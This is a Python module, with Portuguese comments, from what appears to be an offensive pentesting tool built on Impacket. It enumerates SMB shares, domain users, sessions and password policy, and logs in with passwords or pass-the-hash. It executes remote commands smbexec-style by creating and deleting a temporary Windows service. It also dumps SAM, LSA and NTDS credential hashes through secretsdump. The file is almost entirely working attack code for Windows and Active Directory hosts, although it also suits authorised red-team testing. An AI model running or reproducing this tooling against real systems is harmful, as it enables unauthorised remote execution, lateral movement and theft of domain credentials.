"""Operacoes SMB/DCE-RPC sobre Impacket.

Blocos de construcao usados pelo CLI. Cada funcao e defensiva: em erro,
levanta excecao com mensagem util (o chamador decide como reportar).

NOTA: as funcoes que dependem de DCE-RPC (usuarios, sessoes, politica),
de execucao de comando e de secretsdump precisam de um Active Directory /
host Windows real para validacao ponta-a-ponta. Teste em LAB autorizado.
"""

from __future__ import annotations

import random
import string
import time
from dataclasses import dataclass

from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import transport, samr, srvs, scmr
from impacket.dcerpc.v5.dtypes import NULL
from impacket.nt_errors import STATUS_MORE_ENTRIES

from netreap.creds import Credential

DEFAULT_PORT = 445


@dataclass
class HostInfo:
    hostname: str
    domain: str
    os: str
    signing: bool
    smbv1: bool
    dialect: str


def connect(host: str, port: int = DEFAULT_PORT, timeout: int = 5) -> SMBConnection:
    """Abre uma conexao SMB (sem autenticar)."""
    return SMBConnection(host, host, sess_port=port, timeout=timeout)


def host_info(conn: SMBConnection) -> HostInfo:
    """Coleta informacoes do host a partir da conexao (pre ou pos login)."""
    try:
        dialect = conn.getDialect()
    except Exception:
        dialect = 0
    names = {
        0x0202: "SMB 2.0.2", 0x0210: "SMB 2.1",
        0x0300: "SMB 3.0", 0x0302: "SMB 3.0.2", 0x0311: "SMB 3.1.1",
    }
    return HostInfo(
        hostname=conn.getServerName() or "",
        domain=conn.getServerDNSDomainName() or conn.getServerDomain() or "",
        os=conn.getServerOS() or "",
        signing=bool(conn.isSigningRequired()),
        smbv1=(conn.getDialect() == 1),
        dialect=names.get(dialect, "SMB1" if dialect == 1 else "?"),
    )


def login(conn: SMBConnection, cred: Credential) -> None:
    """Autentica na conexao (senha ou pass-the-hash). Levanta em falha."""
    conn.login(
        cred.username, cred.password, cred.domain,
        lmhash=cred.lmhash, nthash=cred.nthash,
    )


# ---------- DCE-RPC helper ----------

def _dce(host: str, port: int, pipe: str, uuid, cred: Credential,
         timeout: int):
    rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{host}[{pipe}]")
    rpctransport.set_connect_timeout(timeout)
    if hasattr(rpctransport, "set_credentials"):
        rpctransport.set_credentials(
            cred.username, cred.password, cred.domain,
            cred.lmhash, cred.nthash,
        )
    rpctransport.setRemoteHost(host)
    try:
        rpctransport.set_dport(port)
    except AttributeError:
        pass
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(uuid)
    return dce


def admin_check(host: str, port: int, cred: Credential, timeout: int) -> bool:
    """True se conseguimos abrir o Service Control Manager (= admin local)."""
    try:
        dce = _dce(host, port, r"\svcctl", scmr.MSRPC_UUID_SCMR, cred, timeout)
        scmr.hROpenSCManagerW(dce)
        dce.disconnect()
        return True
    except Exception:
        return False


# ---------- enumeracao ----------

def list_shares(conn: SMBConnection, cred: Credential) -> list[dict]:
    """Lista shares e testa acesso de leitura/escrita."""
    shares = []
    for share in conn.listShares():
        name = share["shi1_netname"][:-1]
        remark = share["shi1_remark"][:-1]
        access = []
        for perm, test in (("READ", "\\*"),):
            try:
                conn.listPath(name, test)
                access.append(perm)
            except Exception:
                pass
        shares.append({"name": name, "remark": remark,
                       "access": ",".join(access) or "-"})
    return shares


def enum_users(host: str, port: int, cred: Credential,
               timeout: int) -> list[dict]:
    """Enumera usuarios do dominio via SAMR."""
    dce = _dce(host, port, r"\samr", samr.MSRPC_UUID_SAMR, cred, timeout)
    users: list[dict] = []
    try:
        server = samr.hSamrConnect(dce)["ServerHandle"]
        domains = samr.hSamrEnumerateDomainsInSamServer(dce, server)
        for entry in domains["Buffer"]["Buffer"]:
            dom_name = entry["Name"]
            if dom_name.lower() == "builtin":
                continue
            sid = samr.hSamrLookupDomainInSamServer(dce, server, dom_name)
            handle = samr.hSamrOpenDomain(
                dce, server, domainId=sid["DomainId"])["DomainHandle"]
            status = STATUS_MORE_ENTRIES
            ctx = 0
            while status == STATUS_MORE_ENTRIES:
                try:
                    resp = samr.hSamrEnumerateUsersInDomain(
                        dce, handle, enumerationContext=ctx)
                except Exception as exc:
                    if hasattr(exc, "get_error_code") and \
                            exc.get_error_code() == STATUS_MORE_ENTRIES:
                        resp = exc.get_packet()
                    else:
                        raise
                for user in resp["Buffer"]["Buffer"]:
                    users.append({"name": user["Name"],
                                  "rid": user["RelativeId"],
                                  "domain": dom_name})
                ctx = resp["EnumerationContext"]
                status = resp["ErrorCode"]
    finally:
        dce.disconnect()
    return users


def enum_sessions(host: str, port: int, cred: Credential,
                  timeout: int) -> list[dict]:
    """Lista sessoes ativas via SRVSVC NetSessEnum (nivel 10)."""
    dce = _dce(host, port, r"\srvsvc", srvs.MSRPC_UUID_SRVS, cred, timeout)
    out: list[dict] = []
    try:
        resp = srvs.hNetrSessionEnum(dce, NULL, NULL, 10)
        for sess in resp["InfoStruct"]["SessionInfo"]["Level10"]["Buffer"]:
            out.append({"user": sess["sesi10_username"][:-1],
                        "origin": sess["sesi10_cname"][:-1]})
    finally:
        dce.disconnect()
    return out


def password_policy(host: str, port: int, cred: Credential,
                    timeout: int) -> dict:
    """Le a politica de senha do dominio via SAMR."""
    dce = _dce(host, port, r"\samr", samr.MSRPC_UUID_SAMR, cred, timeout)
    try:
        server = samr.hSamrConnect(dce)["ServerHandle"]
        domains = samr.hSamrEnumerateDomainsInSamServer(dce, server)
        dom_name = next(e["Name"] for e in domains["Buffer"]["Buffer"]
                        if e["Name"].lower() != "builtin")
        sid = samr.hSamrLookupDomainInSamServer(dce, server, dom_name)
        handle = samr.hSamrOpenDomain(
            dce, server, domainId=sid["DomainId"])["DomainHandle"]
        info = samr.hSamrQueryInformationDomain2(
            dce, handle,
            samr.DOMAIN_INFORMATION_CLASS.DomainPasswordInformation)
        pwd = info["Buffer"]["Password"]
        return {
            "domain": dom_name,
            "min_length": pwd["MinPasswordLength"],
            "history": pwd["PasswordHistoryLength"],
            "complexity": bool(pwd["PasswordProperties"] & 0x1),
        }
    finally:
        dce.disconnect()


# ---------- execucao de comando (smbexec via SVCCTL) ----------

def _rand(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


def exec_command(host: str, port: int, cred: Credential, command: str,
                 timeout: int) -> str:
    """Executa um comando criando um servico temporario e lendo a saida
    de C$\\Windows\\Temp (padrao smbexec). Requer privilegio de admin."""
    conn = connect(host, port, timeout)
    login(conn, cred)

    tmp = _rand()
    out_path = f"\\Windows\\Temp\\{tmp}"
    bin_path = f"%COMSPEC% /Q /c {command} 1> {out_path} 2>&1"
    svc_name = _rand()

    dce = _dce(host, port, r"\svcctl", scmr.MSRPC_UUID_SCMR, cred, timeout)
    scm = scmr.hROpenSCManagerW(dce)["lpScHandle"]
    svc = scmr.hRCreateServiceW(
        dce, scm, svc_name + "\x00", svc_name + "\x00",
        lpBinaryPathName=bin_path + "\x00",
        dwStartType=scmr.SERVICE_DEMAND_START)["lpServiceHandle"]
    try:
        scmr.hRStartServiceW(dce, svc)
    except Exception:
        pass  # o servico encerra imediatamente; erro e esperado
    scmr.hRDeleteService(dce, svc)
    scmr.hRCloseServiceHandle(dce, svc)
    dce.disconnect()

    time.sleep(1.0)
    data = b""
    try:
        from io import BytesIO
        buf = BytesIO()
        conn.getFile("C$", out_path, buf.write)
        data = buf.getvalue()
    finally:
        try:
            conn.deleteFile("C$", out_path)
        except Exception:
            pass
    return data.decode("utf-8", "replace")


# ---------- secretsdump (SAM/LSA/NTDS) ----------

def dump_secrets(host: str, port: int, cred: Credential, timeout: int,
                 do_sam: bool = True, do_lsa: bool = True,
                 do_ntds: bool = False) -> list[str]:
    """Extrai segredos locais (SAM/LSA) e, opcionalmente, NTDS.

    Reusa as classes de secretsdump da Impacket (mesma base do CME)."""
    from impacket.examples.secretsdump import (
        RemoteOperations, SAMHashes, LSASecrets, NTDSHashes,
    )

    conn = connect(host, port, timeout)
    login(conn, cred)

    results: list[str] = []
    collect = lambda _type, secret: results.append(secret)

    remote_ops = RemoteOperations(conn, False, None)
    remote_ops.enableRegistry()
    try:
        boot_key = remote_ops.getBootKey()

        if do_sam:
            sam_file = remote_ops.saveSAM()
            sam = SAMHashes(sam_file, boot_key, isRemote=True,
                            perSecretCallback=collect)
            sam.dump()
            sam.finish()

        if do_lsa:
            sec_file = remote_ops.saveSECURITY()
            lsa = LSASecrets(sec_file, boot_key, remote_ops, isRemote=True,
                             perSecretCallback=collect)
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()

        if do_ntds:
            ntds_file = remote_ops.saveNTDS()
            ntds = NTDSHashes(ntds_file, boot_key, isRemote=True,
                              remoteOps=remote_ops, noLMHash=True,
                              useVSSMethod=False,
                              perSecretCallback=lambda _t, s, *a: results.append(s))
            ntds.dump()
            ntds.finish()
    finally:
        try:
            remote_ops.finish()
        except Exception:
            pass
    return results
